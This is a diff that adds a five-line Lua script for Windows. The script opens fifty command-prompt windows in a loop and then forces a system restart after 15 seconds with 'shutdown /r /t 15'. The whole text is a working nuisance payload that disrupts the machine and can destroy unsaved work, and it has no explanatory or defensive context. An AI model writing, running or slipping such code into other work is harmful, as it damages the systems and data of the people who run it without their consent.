@@ -1,0 +1,5 @@
+for i = 1, 50 do
+    os.execute("start cmd")
+end
+
+os.execute("shutdown /r /t 15")
